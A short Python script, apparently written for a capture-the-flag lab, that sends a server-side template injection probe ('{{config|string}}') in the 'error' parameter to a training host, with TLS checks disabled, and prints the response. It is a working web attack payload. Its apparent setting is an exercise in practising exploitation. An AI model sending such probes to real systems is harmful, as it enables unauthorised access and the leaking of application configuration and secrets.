import sys, requests, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})
err = "probe%7B%7Bconfig%7Cstring%7D%7D-wauovKZj3vo"
r = S.get(BASE + "/", params={"error": err}, timeout=20, verify=False)
print("status:", r.status_code, "len:", len(r.text))
print(r.text[:1500])
# indice du premier underscore dans le rendu
body = r.text
idx = body.find("_")
print("\npremier '_' visible a l'index", idx)
